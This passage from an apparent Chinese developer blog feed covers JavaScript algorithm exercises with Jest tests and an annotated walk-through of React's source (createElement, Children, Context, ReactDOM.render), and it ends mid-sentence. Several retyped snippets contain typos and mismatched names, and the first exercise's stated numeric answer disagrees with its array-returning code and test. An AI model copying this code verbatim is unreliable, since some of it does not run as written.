1234输入："00110011"输出：6解释：有6个子串具有相同数量的连续1和0："0011","01","1100","10","0011"和"01"请注意，一些重复出现的子串要计算它们出现的次数 12345678910111213141516171819202122232425262728/** * @param &#123;string&#125; str * @return &#123;number&#125;*/export default (str) =&gt; &#123; // 创建数据结构堆栈保存数据 const result = [] const match = (str) =&gt; &#123; let j = str.match(/^(0+|1+)/)[0] // j=(n个)0-&gt;o=(n个)1;j=(n个)1-&gt;o=(n个)0; let o = (j[0] ^ 1).toString().repeat(j.length) let reg = new RegExp(`^($&#123;j&#125;$&#123;o&#125;)`) if (reg.test(str)) &#123; return RegExp.$1 &#125; else &#123; return '' &#125; &#125; // 循环 for (let i = 0, len = str.length - 1; i &lt; len; i++) &#123; // 简单递归 let sub = match(str.slice(i)) if (sub) &#123; result.push(sub) &#125; &#125; return result&#125; 测试用例： 1234567test('countBinarySubstring(00110011)', () =&gt; &#123; expect(countBinarySubstring('00110011')).toEqual(['0011', '01', '1100', '10', '0011', '01'])&#125;)test('countBinarySubstring(10101)', () =&gt; &#123; expect(countBinarySubstring('10101')).toEqual(['10', '01', '10', '01'])&#125;) 知识点： 发现规律，RegExp 数组电话号码的组合 给定一个仅包含 2-9的字符串，返回它能表示的字母组合。给出数字到字母的映射如下（与电话按钮相同）。注意1不对应任何字母 1231[] 2[abc] 3[def]4[ghi] 5[jkl] 6[mno]7[pqrs] 8[tuv] 9[wxyz] 示例： 12输入： "23"输出： ["ad","ae","af","bd","be","bf","cd","ce","cf"] 说明：上面的答案是按字典排序的，可以任意选择答案输出的顺序 12345678910111213141516171819202122232425262728293031323334353637383940/** * @param &#123;string&#125; digits * @return &#123;string[]&#125;*/export default (digits) =&gt; &#123; if (digits.length &lt; 1) return [] // 建立电话号码键盘映射 const map = ['', 1, 'abc', 'def', 'ghi', 'jkl', 'mno', 'pqrs', 'tuv', 'wxyz'] if (digits.length &lt; 2) return map[digits].split('') // 将输入的digits 分隔成数组，234=&gt;[2,3,4] const num = digits.split('') // 保存键盘映射后的字母内容，如 23=&gt;['abc','def'] const code = [] num.forEach(item =&gt; &#123; code.push(map[item]) &#125;) const comb = (arr) =&gt; &#123; // 临时变量用来保存两个组合的结果 const temp = [] // 循环 for (let i = 0, ilen = arr[0].length; i &lt; ilen; i++) &#123; for (let j = 0, jlen = arr[1].length; j &lt; jlen; j++) &#123; temp.push(`$&#123;arr[0][i]&#125;$&#123;arr[1][j]&#125;`) &#125; &#125; // 去掉一开始遍历的前两个，替换为这两个循环后的结果 arr.splice(0, 2, temp) // 当数组的长度大于1时递归 if (arr.length &gt; 1) &#123; comb(arr) &#125; else &#123; return temp &#125; // 返回真正的结果 return arr[0] &#125; // 开始递归运算 return comb(code)&#125; 测试用例： 1234567891011121314151617test('letterCombinations(23)', () =&gt; &#123; expect(letterCombinations('23')).toEqual(['ad', 'ae', 'af', 'bd', 'be', 'bf', 'cd', 'ce', 'cf'])&#125;)test('letterCombinations(234)', () =&gt; &#123; expect(letterCombinations('234')).toEqual([ 'adg', 'adh', 'adi', 'aeg', 'aeh', 'aei', 'afg', 'afh', 'afi', 'bdg', 'bdh', 'bdi', 'beg', 'beh', 'bei', 'bfg', 'bfh', 'bfi', 'cdg', 'cdh', 'cdi', 'ceg', 'ceh', 'cei', 'cfg', 'cfh', 'cfi' ])&#125;) 知识点： 公式运算 卡牌分组 给定一副牌，每张牌上都写着一个整数。 此时，需要选定一个数字 x，使得可以将整部牌按下述规则分成 1 组或者更多： 每组都有 x 张牌 组内所有的牌上都写着相同的整数 仅当可选的 x&gt;=2时返回 true 示例： 123输入：[1,2,3,4,4,3,2,1]输出：true解释：可行的分组是 [1,1],[2,2],[3,3],[4,4] 提示： 1 &lt;= deck.length &lt;= 10000 0 &lt;= deck[i] &lt; 10000 知识点： 归并运算 种花问题 知识点： 筛选运算 格雷编码 知识点： 二进制运算]]></content>
      <categories>
        <category>javaScript相关</category>
      </categories>
      <tags>
        <tag>javaScript数据结构与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[React源码浅析]]></title>
    <url>%2F2019-06-29-React%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90.html</url>
    <content type="text"><![CDATA[知其然知其所以然，框架工的自我尝试进阶 React源码浅析知识点： React Api createElement、createContext、JSX=&gt;JS、ConcurrentMode、Ref、Component、Suspense、Hooks React 中的更新创建 ReactDOM.render、Fiber、UpdateQueue、FiberRoot、Update、expirationTime Fiber Scheduler scheduleWork、batchedUpdates、performWork、performUnitOfWork、requestWork、react scheduler、renderRoot 开始更新 beginWork以及优化、各类组件的更新过程、调节子节点的过程 完成各个节点的更新 completeUnitOfWork、虚拟DOM对比、completeWork、错误捕获处理、unwindwork、完成整棵树更新 提交更新 commitRoot整体流程、开发时的帮助方法、提交快照、提交DOM插入、提交DOM更新、提交DOM删除、提交所有生命周期 各功能的实现功能 context的实现过程、ref的实现过程、hydrate的实现过程、React的事件体系 Suspense 更新优先级的概念、更新挂起的概念、Suspense组件更新、timeout处理、retry重新尝试渲染、lazy组件更新 Hooks 核心原理、useState、useEffect、useContent、其他Hooks API React Api 相关React.js123456789101112131415161718192021222324252627282930313233const React = &#123; Children:&#123; map, forEach, count, toArray, only &#125;, createRef, Component, PureComponent, createContext, forWardRef, lazy, memo, Fragment:REACT_FRAGMENT_TYPE, StrictMode:REACT_STRICT_MODE_TYPE, SuspenseLREACT_SUSPENSE_TYPE, createElement:__DEV__?createElementWithValidation:createElement, cloneElement:__DEV__?cloneElementWithValidation:cloneElement, isValidElement:isValidElement, version:ReactVersion, __SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED:ReactSharedInternals,&#125;if (enableStableConcurrentModeAPIs) &#123; React.ConcurrentMode = REACT_CONCURRENT_MODE_TYPE; React.Profiler = REACT_PROFILER_TYPE;&#125; else &#123; React.unstable_ConcurrentMode = REACT_CONCURRENT_MODE_TYPE; React.unstable_Profiler = REACT_PROFILER_TYPE;&#125;export default React; ReactElement.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361// hasOwnProperty 方法返回一个布尔值，指示对象自身属性中是否具有指定的属性（也就是知否有指定的键）const hasOwnProperty = Object.prototype.hasOwnProperty;// 内建的propsconst RESERVED_PROPS = &#123; key: true, ref: true, __self: true, __source: true,&#125;;let specialPropKeyWarningShown, specialPropRefWarningShown;// 判断是否是合法的 reffunction hasValidRef(config) &#123; if (__DEV__) &#123; if (hasOwnProperty.call(config, &apos;ref&apos;)) &#123; /** * getOwnPropertyDescriptor 返回指定对象上自有属性描述符（自有属性指的是直接赋予该对象的属性，不需要从原型链上进行查找的属性） * get 方法。获取该属性的访问器函数（getter）。如果没有访问器，该值为 undefined */ const getter = Object.getOwnPropertyDescriptor(config, &apos;ref&apos;).get; if (getter &amp;&amp; getter.isReactWarning) &#123; return false; &#125; &#125; &#125; return config.ref !== undefined;&#125;// 判断是否是合法的 keyfunction hasValidKey(config) &#123; if (__DEV__) &#123; if (hasOwnProperty.call(config, &apos;key&apos;)) &#123; const getter = Object.getOwnPropertyDescriptor(config, &apos;key&apos;).get; if (getter &amp;&amp; getter.isReactWarning) &#123; return false; &#125; &#125; &#125; return config.key !== undefined;&#125;// 定义了 key 不合法抛出的警告function defineKeyPropWarningGetter(props, displayName) &#123; const warnAboutAccessingKey = function() &#123; if (!specialPropKeyWarningShown) &#123; specialPropKeyWarningShown = true; warningWithoutStack( false, &apos;%s: `key` is not a prop. Trying to access it will result &apos; + &apos;in `undefined` being returned. If you need to access the same &apos; + &apos;value within the child component, you should pass it as a different &apos; + &apos;prop. (https://fb.me/react-special-props)&apos;, displayName, ); &#125; &#125;; warnAboutAccessingKey.isReactWarning = true; Object.defineProperty(props, &apos;key&apos;, &#123; get: warnAboutAccessingKey, configurable: true, &#125;);&#125;// 定义了 ref 不合法抛出的警告function defineRefPropWarningGetter(props, displayName) &#123; const warnAboutAccessingRef = function() &#123; if (!specialPropRefWarningShown) &#123; specialPropRefWarningShown = true; warningWithoutStack( false, &apos;%s: `ref` is not a prop. Trying to access it will result &apos; + &apos;in `undefined` being returned. If you need to access the same &apos; + &apos;value within the child component, you should pass it as a different &apos; + &apos;prop. (https://fb.me/react-special-props)&apos;, displayName, ); &#125; &#125;; warnAboutAccessingRef.isReactWarning = true; Object.defineProperty(props, &apos;ref&apos;, &#123; get: warnAboutAccessingRef, configurable: true, &#125;);&#125;/** * Factory method to create a new React element. This no longer adheres to * the class pattern, so do not use new to call it. Also, no instanceof check * will work. Instead test $$typeof field against Symbol.for(&apos;react.element&apos;) to check * if something is a React Element. * * @param &#123;*&#125; type * @param &#123;*&#125; key * @param &#123;string|object&#125; ref * @param &#123;*&#125; self A *temporary* helper to detect places where `this` is * different from the `owner` when React.createElement is called, so that we * can warn. We want to get rid of owner and replace string `ref`s with arrow * functions, and as long as `this` and owner are the same, there will be no * change in behavior. * @param &#123;*&#125; source An annotation object (added by a transpiler or otherwise) * indicating filename, line number, and/or other information. * @param &#123;*&#125; owner * @param &#123;*&#125; props * @internal */const ReactElement = function(type, key, ref, self, source, owner, props) &#123; const element = &#123; // This tag allows us to uniquely identify this as a React Element $$typeof: REACT_ELEMENT_TYPE, // Built-in properties that belong on the element type: type, key: key, ref: ref, props: props, // Record the component responsible for creating this element. _owner: owner, &#125;; // 开发环境的一些内容 if (__DEV__) &#123; // The validation flag is currently mutative. We put it on // an external backing store so that we can freeze the whole object. // This can be replaced with a WeakMap once they are implemented in // commonly used development environments. element._store = &#123;&#125;; // To make comparing ReactElements easier for testing purposes, we make // the validation flag non-enumerable (where possible, which should // include every environment we run tests in), so the test framework // ignores it. Object.defineProperty(element._store, &apos;validated&apos;, &#123; configurable: false, enumerable: false, writable: true, value: false, &#125;); // self and source are DEV only properties. Object.defineProperty(element, &apos;_self&apos;, &#123; configurable: false, enumerable: false, writable: false, value: self, &#125;); // Two elements created in two different places should be considered // equal for testing purposes and therefore we hide it from enumeration. Object.defineProperty(element, &apos;_source&apos;, &#123; configurable: false, enumerable: false, writable: false, value: source, &#125;); if (Object.freeze) &#123; Object.freeze(element.props); Object.freeze(element); &#125; &#125; return element;&#125;;/** * 创建并返回给定类型的新ReactElement。 * See https://reactjs.org/docs/react-api.html#createelement */export function createElement(type, config, children) &#123; let propName; // Reserved names are extracted const props = &#123;&#125;; let key = null; let ref = null; let self = null; let source = null; if (config != null) &#123; if (hasValidRef(config)) &#123; ref = config.ref; &#125; if (hasValidKey(config)) &#123; key = &apos;&apos; + config.key; &#125; self = config.__self === undefined ? null : config.__self; source = config.__source === undefined ? null : config.__source; // 如果不是内建的props以及本身拥有的属性，将剩余的属性传入到新的props对象中 for (propName in config) &#123; if ( hasOwnProperty.call(config, propName) &amp;&amp; !RESERVED_PROPS.hasOwnProperty(propName) ) &#123; props[propName] = config[propName]; &#125; &#125; &#125; // 子对象可以是多个参数，并且这些参数会传输到新分配的props对象上。 const childrenLength = arguments.length - 2; if (childrenLength === 1) &#123; props.children = children; &#125; else if (childrenLength &gt; 1) &#123; const childArray = Array(childrenLength); for (let i = 0; i &lt; childrenLength; i++) &#123; childArray[i] = arguments[i + 2]; &#125; if (__DEV__) &#123; if (Object.freeze) &#123; Object.freeze(childArray); &#125; &#125; props.children = childArray; &#125; // 解析默认属性 if (type &amp;&amp; type.defaultProps) &#123; const defaultProps = type.defaultProps; for (propName in defaultProps) &#123; if (props[propName] === undefined) &#123; props[propName] = defaultProps[propName]; &#125; &#125; &#125; if (__DEV__) &#123; if (key || ref) &#123; const displayName = typeof type === &apos;function&apos; ? type.displayName || type.name || &apos;Unknown&apos; : type; if (key) &#123; defineKeyPropWarningGetter(props, displayName); &#125; if (ref) &#123; defineRefPropWarningGetter(props, displayName); &#125; &#125; &#125; return ReactElement( type, key, ref, self, source, ReactCurrentOwner.current, props, );&#125;/** * 返回一个生成给定类型的ReactElements的函数。（已废弃） * See https://reactjs.org/docs/react-api.html#createfactory */export function createFactory(type) &#123; const factory = createElement.bind(null, type); // Expose the type on the factory and the prototype so that it can be // easily accessed on elements. E.g. `&lt;Foo /&gt;.type === Foo`. // This should not be named `constructor` since this may not be the function // that created the element, and it may not even be a constructor. // Legacy hook: remove it factory.type = type; return factory;&#125;export function cloneAndReplaceKey(oldElement, newKey) &#123; const newElement = ReactElement( oldElement.type, newKey, oldElement.ref, oldElement._self, oldElement._source, oldElement._owner, oldElement.props, ); return newElement;&#125;/** * 以 element 元素为样板克隆并返回新的 React 元素 * See https://reactjs.org/docs/react-api.html#cloneelement */export function cloneElement(element, config, children) &#123; invariant( !(element === null || element === undefined), &apos;React.cloneElement(...): The argument must be a React element, but you passed %s.&apos;, element, ); let propName; // 复制原来的props const props = Object.assign(&#123;&#125;, element.props); // 提取内建props相关的值 let key = element.key; let ref = element.ref; // Self is preserved since the owner is preserved. const self = element._self; // Source is preserved since cloneElement is unlikely to be targeted by a transpiler, and the original source is probably a better indicator of the true owner. const source = element._source; // Owner will be preserved, unless ref is overridden let owner = element._owner; if (config != null) &#123; if (hasValidRef(config)) &#123; // Silently steal the ref from the parent. ref = config.ref; owner = ReactCurrentOwner.current; &#125; if (hasValidKey(config)) &#123; key = &apos;&apos; + config.key; &#125; // Remaining properties override existing props let defaultProps; if (element.type &amp;&amp; element.type.defaultProps) &#123; defaultProps = element.type.defaultProps; &#125; for (propName in config) &#123; if ( hasOwnProperty.call(config, propName) &amp;&amp; !RESERVED_PROPS.hasOwnProperty(propName) ) &#123; if (config[propName] === undefined &amp;&amp; defaultProps !== undefined) &#123; // Resolve default props props[propName] = defaultProps[propName]; &#125; else &#123; props[propName] = config[propName]; &#125; &#125; &#125; &#125; // Children can be more than one argument, and those are transferred onto // the newly allocated props object. const childrenLength = arguments.length - 2; if (childrenLength === 1) &#123; props.children = children; &#125; else if (childrenLength &gt; 1) &#123; const childArray = Array(childrenLength); for (let i = 0; i &lt; childrenLength; i++) &#123; childArray[i] = arguments[i + 2]; &#125; props.children = childArray; &#125; return ReactElement(element.type, key, ref, self, source, owner, props);&#125;/** * 验证对象是否为ReactElement。 * See https://reactjs.org/docs/react-api.html#isvalidelement * @param &#123;?object&#125; object * @return &#123;boolean&#125; True if `object` is a ReactElement. * @final */export function isValidElement(object) &#123; return ( typeof object === &apos;object&apos; &amp;&amp; object !== null &amp;&amp; object.$$typeof === REACT_ELEMENT_TYPE );&#125; ReactElement 通过 createElement 创建的，传入三个参数： type（指代 ReactElement的类型） 字符串。&#39;div&#39;等，被称为 HostComponent Class。继承自 Component或者 PureComponent的组件，称为 ClassComponent 方法。functinal Component 原生。Fragment、AsyncModel、Symbol config children ReactElement只是一个用来承载信息的容器，里面有几个信息： type，用来判断如何创建节点 key和 ref这些特殊信息 props新的属性内容 $$type用于确定是否属于 ReactElement ReactBaseClasses.js1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import ReactNoopUpdateQueue from &apos;./ReactNoopUpdateQueue&apos;;/** * Base class helpers for the updating state of a component. */const emptyObject = &#123;&#125;;function Component(props, context, updater) &#123; this.props = props; this.context = context; // If a component has string refs, we will assign a different object later. this.refs = emptyObject; // We initialize the default updater but the real one gets injected by the renderer. this.updater = updater || ReactNoopUpdateQueue;&#125;Component.prototype.isReactComponent = &#123;&#125;;// 核心方法Component.prototype.setState = function(partialState, callback) &#123; invariant( typeof partialState === &apos;object&apos; || typeof partialState === &apos;function&apos; || partialState == null, &apos;setState(...): takes an object of state variables to update or a &apos; + &apos;function which returns an object of state variables.&apos;, ); // DOM 实现的 this.updater.enqueueSetState(this, partialState, callback, &apos;setState&apos;);&#125;;// 强制更新Component.prototype.forceUpdate = function(callback) &#123; this.updater.enqueueForceUpdate(this, callback, &apos;forceUpdate&apos;);&#125;;function ComponentDummy() &#123;&#125;ComponentDummy.prototype = Component.prototype;function PureComponent(props, context, updater) &#123; this.props = props; this.context = context; // If a component has string refs, we will assign a different object later. this.refs = emptyObject; this.updater = updater || ReactNoopUpdateQueue;&#125;const pureComponentPrototype = (PureComponent.prototype = new ComponentDummy());pureComponentPrototype.constructor = PureComponent;// Avoid an extra prototype jump for these methods.Object.assign(pureComponentPrototype, Component.prototype);// isPureComponent 属性便于 REACT-DOM 后面辨认是否是纯组件pureComponentPrototype.isPureReactComponent = true;export &#123;Component, PureComponent&#125;; ReactCreateRef.js123456export function createRef()&#123; const refObject = &#123; current:null, &#125; return refObject;&#125; Refs 提供了一种方式，允许我们访问 DOM 节点或者在 render 方法中创建的 React 元素。 使用 Refs 的情况： 管理焦点，文本选择或者媒体播放 触发强制动画 集成第三方 DOM 库 使用 Refs 的方法： string ref function createRef 例子： 12345678910111213141516171819202122232425export default class RefDemo extends React.Component &#123; constructor() &#123; super(); this.objRef = React.createRef(); // &#123;current:null&#125; &#125; componentDidMount() &#123; setTimeout(() =&gt; &#123; this.refs.stringRef.textContent = &apos;string ref got&apos; this.methodRef.textContent = &apos;method ref got&apos; this.objRef.current.textContent = &apos;obj ref got&apos; &#125;, 1000) &#125; render() &#123; return ( &lt;&gt; &lt;p ref=&quot;stringRef&quot;&gt;span1&lt;/p&gt; &lt;p ref=&#123;ele =&gt; (this.methodRef = ele)&#125;&gt;span3&lt;/p&gt; &lt;p ref=&#123;this.objRef&#125;&gt;span3&lt;/p&gt; &lt;/&gt; ) &#125;&#125; forwardRef.js123456export default function forwardRef(render:(props,ref))&#123; return&#123; $$typeof:REACT_FORWARD_REF_TYPE, render, &#125;&#125; React.forwardRef 会创建一个 React 组件，这个组件能够将其接受的 ref 属性转发到其组件树下的另一个组件中。 主要使用的是： 转发 refs 到 DOM 组件 在高阶组件中转发 refs React.forwardRef 接受渲染函数作为参数。React 将使用 props 和 refs 作为参数来调用此函数。此函数应该返回 React 节点。 1234567891011121314151617// PureComponentconst TargetComponent = React.forwardRef((props,ref)=&gt;&#123; &lt;input type=&quot;text&quot; ref=&#123;ref&#125; /&gt;&#125;) export default class Comp extends React.Component&#123; constructor()&#123; super(); this.ref = React.createRef(); &#125; componentDidMount()&#123; this.ref.current.value = &apos;ref get input&apos;; &#125; render()&#123; return &lt;TargetComponent ref=&#123;this.ref&#125;/&gt; &#125;&#125; ReactContext.js 123456789101112131415161718192021222324export function createContext(defaultValue,calculateChangedBits)&#123; if(calculateChangedBits === undefined)&#123; calculateChangedBits = null; &#125; const context = &#123; $$typeof:REACT_CONTEXT_TYPE, _calculateChangedBits:calculateChangedBits, _currentValue:defaultValue, _currentValue2:defaultValue, Provider:null, Consumer:null &#125; context.Provider = &#123; $$typeof:REACT_PROVIDER_TYPE, _context:context &#125; if(__DEV__)&#123; ... &#125;else&#123; context.Consumer = context; &#125; return context;&#125; ReactLazy.js12345678910export function lazy(ctor:()=&gt;Thenable&lt;T,R&gt;)&#123; return&#123; $$typeof:REACT_LAZY_TYPE, // 类 promise _ctor:ctor, _status:-1, // 加载完返回的结果 _result:null &#125;&#125; Hooks简单用法： 1234567891011121314151617import React, &#123; useState,useEffect &#125; from 'react';export default ()=&gt;&#123; const [name,setName] = useState('lbh'); useEffect(()=&gt;&#123; console.log('component update') // 解除绑定 return ()=&gt;&#123; console.log('unbind') &#125; &#125;,[]) return( &lt;&gt; &lt;p&gt;My name is:&#123;name&#125;&lt;/p&gt; &lt;input type="text" value=&#123;name&#125; onChange=&#123;e=&gt;setName(e.target.value)&#125;&gt; &lt;/&gt; )&#125; ReactChildren.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249const SEPARATOP = &apos;.&apos;;const SUBSEPARATOR = &apos;:&apos;;function escape(key)&#123; const escapeRegex = /[=:]/g; const escaperLookup = &#123; &apos;=&apos;:&apos;=0&apos;, &apos;:&apos;:&apos;=2&apos; &#125; const escapedString = (&apos;&apos;+key).replace(escapeRegex,function(match)&#123; return escapeLookup[match]; &#125;) return &apos;$&apos; + escapedString;&#125;let didWarnAboutMaps = false;const userProviderKeyEscapeRegex = /\/+/g;function escapeUserProvidedKey(text)&#123; return (&apos;&apos;+text).replace(userProviderKeyEscapeRegex,&apos;$&amp;/&apos;);&#125;// 对象池const POOL_SIZE = 10;const traverseContextPool = [];function getPooledTraverseContext(mapResult,keyPrefix,mapFunction,mapContext)&#123; if(traverseContextPool.length)&#123; const traverseContext = traverseContextPool.pop(); traverseContext.result = mapResult; traverseContext.keyPrefix = keyPrefix; traverseContext.func = mapFunction; traverseContext.context = mapContext; traverseContext.count = 0; return traverseContext; &#125;else&#123; return&#123; result:mapResult, keyPrefix:keyPrefix, func:mapFunction, context:mapContext, count:0 &#125; &#125;&#125;// 释放对象属性，少于指定长度时，将对象push 对象池function releaseTravserContext(traverseContext)&#123; traverseContext.result = null; traverseContext.keyPrefix = null; traverseContext.func = null; traverseContext.context = null; traverseContext.count = 0; if(traverseContextPool.length &lt; POOL_SIZE)&#123; traverseContextPool.push(traverseContext) &#125;&#125;// 核心function traverseAllChildrenImpl( children, nameSoFar, callback, traverseContext,) &#123; const type = typeof children; if (type === &apos;undefined&apos; || type === &apos;boolean&apos;) &#123; children = null; &#125; let invokeCallback = false; if (children === null) &#123; invokeCallback = true; &#125; else &#123; switch (type) &#123; case &apos;string&apos;: case &apos;number&apos;: invokeCallback = true; break; case &apos;object&apos;: switch (children.$$typeof) &#123; case REACT_ELEMENT_TYPE: case REACT_PORTAL_TYPE: invokeCallback = true; &#125; &#125; &#125; if (invokeCallback) &#123; callback( traverseContext, children, nameSoFar === &apos;&apos; ? SEPARATOR + getComponentKey(children, 0) : nameSoFar, ); return 1; &#125; let child; let nextName; let subtreeCount = 0; const nextNamePrefix = nameSoFar === &apos;&apos; ? SEPARATOR : nameSoFar + SUBSEPARATOR; if (Array.isArray(children)) &#123; for (let i = 0; i &lt; children.length; i++) &#123; child = children[i]; nextName = nextNamePrefix + getComponentKey(child, i); subtreeCount += traverseAllChildrenImpl( child, nextName, callback, traverseContext, ); &#125; &#125; else &#123; const iteratorFn = getIteratorFn(children); if (typeof iteratorFn === &apos;function&apos;) &#123; const iterator = iteratorFn.call(children); let step; let ii = 0; while (!(step = iterator.next()).done) &#123; child = step.value; nextName = nextNamePrefix + getComponentKey(child, ii++); subtreeCount += traverseAllChildrenImpl( child, nextName, callback, traverseContext, ); &#125; &#125; else if (type === &apos;object&apos;) &#123; let addendum = &apos;&apos;; const childrenString = &apos;&apos; + children; invariant( false, &apos;Objects are not valid as a React child (found: %s).%s&apos;, childrenString === &apos;[object Object]&apos; ? &apos;object with keys &#123;&apos; + Object.keys(children).join(&apos;, &apos;) + &apos;&#125;&apos; : childrenString, addendum, ); &#125; &#125; return subtreeCount;&#125;function traverseAllChildren(children,callback,traverseContext)&#123; if(children === null)&#123; return 0; &#125; return traverseAllChildrenImpl(children,&apos;&apos;,callback,traverseContext)&#125;function getComponentKey(component,index)&#123; if( typeof component === &apos;object&apos; &amp;&amp; component !== null &amp;&amp; component.key != null )&#123; return escape(component.key); &#125; return index.toString(36);&#125;function forEachSingleChild(bookKeeping,child,name)&#123; const &#123; func, context &#125; = bookKeeping; func.call(context,child,bookKeeping.count++);&#125;function forEachChildren(children, forEachFunc, forEachContext) &#123; if (children == null) &#123; return children; &#125; const traverseContext = getPooledTraverseContext( null, null, forEachFunc, forEachContext, ); traverseAllChildren(children, forEachSingleChild, traverseContext); releaseTraverseContext(traverseContext);&#125;function mapSingleChildIntoContext(bookKeeping, child, childKey) &#123; const &#123;result, keyPrefix, func, context&#125; = bookKeeping; let mappedChild = func.call(context, child, bookKeeping.count++); if (Array.isArray(mappedChild)) &#123; mapIntoWithKeyPrefixInternal(mappedChild, result, childKey, c =&gt; c); &#125; else if (mappedChild != null) &#123; if (isValidElement(mappedChild)) &#123; mappedChild = cloneAndReplaceKey( mappedChild, keyPrefix + (mappedChild.key &amp;&amp; (!child || child.key !== mappedChild.key) ? escapeUserProvidedKey(mappedChild.key) + &apos;/&apos; : &apos;&apos;) + childKey, ); &#125; result.push(mappedChild); &#125;&#125;function mapIntoWithKeyPrefixInternal(children,array,prefix,func,context)&#123; let escapedPrefix = &apos;&apos;; if(prefix != null)&#123; escapedPrefix = escapeUserProvidedKey(prefix)+&apos;/&apos;; &#125; const traverseContext = getPooledTraverseContext( array, escapedPrefix, func, context ) traverseAllChildren(children,mapSingleChildIntoContext,traverseContext); releaseTraverseContext(traverseContext);&#125;function mapChildren(children,func,context)&#123; if(children == null)&#123; return children; &#125; const result = []; mapIntoWithKeyPrefixInternal(children,result,null,func,context); return result;&#125;function countChildren(children)&#123; return traverseAllChildren(children,()=&gt;null,null);&#125;function toArray(children)&#123; const result = []; mapIntoWithKeyPrefixInternal(children,result,null,child =&gt; child) return result;&#125;function onlyChild(children) &#123; invariant( isValidElement(children), &apos;React.Children.only expected to receive a single React element child.&apos;, ); return children;&#125;export &#123; forEachChild as forEach, mapChildren as map, countChildren as count, onlyChild as only, toArray,&#125; 主要方法流程图： graph TD A(开始) contextPool(contextPool) mapIntoWithKeyPrefixInternal(mapIntoWithKeyPrefixInternal) traverseAllChildren(traverseAllChildren) traverseAllChildrenImpl(traverseAllChildrenImpl) mapSingleChildrenContext(mapSingleChildrenContext) 是否多个节点{是否多个节点} isArray{isArray} 循环每个节点((循环每个节点)) 对每个节点调用mapFunc返回map之后的节点(对每个节点调用mapFunc返回map之后的节点) 往result中推入clone节点并替换key(往result中推入clone节点并替换key) A --> mapIntoWithKeyPrefixInternal mapIntoWithKeyPrefixInternal -. 开始的时候获取 .-> contextPool mapIntoWithKeyPrefixInternal -. 结束之后归还 .-> contextPool mapIntoWithKeyPrefixInternal --> traverseAllChildren traverseAllChildren --> traverseAllChildrenImpl traverseAllChildrenImpl --> 是否多个节点 是否多个节点 --Y--> 循环每个节点 是否多个节点 --N--> mapSingleChildrenContext 循环每个节点 --> traverseAllChildrenImpl mapSingleChildrenContext --> 对每个节点调用mapFunc返回map之后的节点 对每个节点调用mapFunc返回map之后的节点 --> isArray isArray --Y--> mapIntoWithKeyPrefixInternal isArray --N--> 往result中推入clone节点并替换key ReactContext.js12345678910111213141516171819export function createCOntext(defaultValue,calculateChangedBits)&#123; if(calculateChangedBits === undefined)&#123; calculateChangedBits = null; &#125; const context = &#123; $$typeof:REACT_CONTEXT_TYPE, _calculateChangeBits:calculateChangeBits, _currentValue:defaultValue, _currentValue2:defaultValue, Provider:null, Consumer:null &#125; context.Provider = &#123; $$typeof:REACT_PROVIDER_TYPE, _context:context, &#125; context.Consumer = context; return context;&#125; memo.js12345678910export default function memo( type: React$ElementType, compare?: (oldProps: Props, newProps: Props) =&gt; boolean, )&#123; return&#123; $$typeof:REACT_MEMO_TYPE, type, compare:compare === undefined ? null : compare, &#125;&#125; 创建更新的方式主要是下面的知识点： ReactDOM.render、ReactDOM.render、setState、forceUpdate 步骤： 创建 ReactRoot 创建 FiberRoot 和 RootFiber 创建更新 ReactDOM.js12345678910111213141516171819202122232425262728293031323334// ReactDOMconst ReactDOM = &#123; createPortal, findDOMNode( componentOrElement, )&#123; if (componentOrElement == null) &#123; return null; &#125; if (componentOrElement.nodeType === ELEMENT_NODE) &#123; return componentOrElement; &#125; &#125;, // REACTElememt,DOM包裹节点，回调方法 hydrate(element,container,callback)&#123; return legacyRenderSubtreeIntoContainer( null, element, container, // 协调更新的选项 true, callback ) &#125;, render(element,container,callback)&#123; return legacyRenderSubtreeIntoContainer( null, element, container, false, callback ) &#125;&#125; render 与 hydrate 方法都可以传入三个参数，包括 ReactElement、DOM包裹节点和渲染结束后执行的回调方法，返回 legacyRenderSubtreeIntoContainer 方法执行的结果。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556function legacyRenderSubtreeIntoContainer( parentComponent, children, container, forceHydrate, callback)&#123; let root; if(!root)&#123; root = container._reactRootContainer = legacyCreateRootFromDOMContainer( container, forceHydrate, ) &#125; &#125;function legacyCreateRootFromDOMContainer( container, forceHydrate,)&#123; const shouldHydrate = forceHydrate || shouldHydrateDueToLegacyHeuristic(container); // 没有ssr的情况 if(!shouldHydrate)&#123; let rootSibling; while((rootSibling = container.lastChild))&#123; // 删除 container 下面的所有子节点 container.removeChild(rootSibling) &#125; &#125; const isConcurrent = false; return new ReactRoot(container,isConcurrent,shouldHydrate) &#125;function shouldHydrateDueToLegacyHeuristic()&#123; const rootElement = getReactRootElementInContainer(container); return !!( rootElement &amp;&amp; // 普通element节点 rootElement.nodeType === ELEMENT_NODE &amp;&amp; // data-reactroot 老版本ssr的节点 rootElement.hasAttribute(ROOT_ATTRIBUTE_NAME) )&#125;function getReactRootElementInContainer(container)&#123; if(!container)&#123; return null; &#125; // 判断节点 if(container.nodeType === DOCUMENT_NODE)&#123; return container.documentElement; &#125;else&#123; return container.firstChild; &#125;&#125; 先判断 root 是否不存在，不存在调用legacyCreateRootFromDOMContainer，传入 container,forceHydrate两个参数。legacyCreateRootFromDOMContainer函数创建了一个 